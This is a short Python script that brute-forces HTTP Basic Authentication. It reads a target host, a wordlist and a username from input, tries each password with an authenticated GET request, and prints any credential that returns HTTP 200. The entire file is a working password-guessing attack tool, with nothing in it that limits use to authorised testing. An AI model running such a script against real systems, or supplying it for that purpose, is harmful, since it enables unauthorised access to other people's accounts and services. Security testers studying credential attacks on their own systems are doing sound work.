import requests

url = str(input("Target: "))
wordlist = str(input("Wordlist Path: "))
user = str(input("User to test: "))
f = open(wordlist, "r")
print ("-" * 25)
print ("Running script")
for line in f.readlines():
    line = line.rstrip() # Remove "\n" caused by break of line.
    login = requests.get("http://" + url, auth = (user, line))
    #print ("Testando PW: {}" .format(line)) # Show passwords being tested
    if login.status_code == 200:
        print ("-" * 25)
        print ("Password found!")
        print ("User: \033[1;32m{}\033[m" .format(user))
        print ("Password: \033[1;32m{}\033[m" .format(line))
        print ("-" * 25)
        break
if login.status_code != 200:
    print ("-" * 25)
    print ("None password found!")
